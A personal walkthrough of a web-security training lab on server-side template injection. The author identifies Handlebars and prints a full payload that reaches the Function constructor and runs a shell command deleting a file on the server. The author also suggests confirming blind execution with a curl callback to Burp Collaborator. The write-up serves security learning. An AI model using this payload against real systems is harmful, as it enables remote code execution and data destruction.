# Practitioner Lab 110: Server-side template injection in an unknown language with a documented exploit

---

This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

![Untitled](Practitioner%20Lab%20110%20Server-side%20template%20injectio%20e95658f5139545ef9b20c5bab9ae52d5/Untitled.png)

Found this as I was browsing the website. 

![Untitled](Practitioner%20Lab%20110%20Server-side%20template%20injectio%20e95658f5139545ef9b20c5bab9ae52d5/Untitled%201.png)

I found it was handlebars. I searched for a handlebars exploit and found one that had been done on shopify.  the thing with this exploit is that it doesn’t give an output. 

after using this payload. 

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

```

I had to url encode this and this worked fine. 

it solved the lab. I was previously running the exploit and it was not giving me any type of output.

A better way to test it is with burp collaborator. you can do a curl to the burp collaborator and if it works then it means that it is running the command.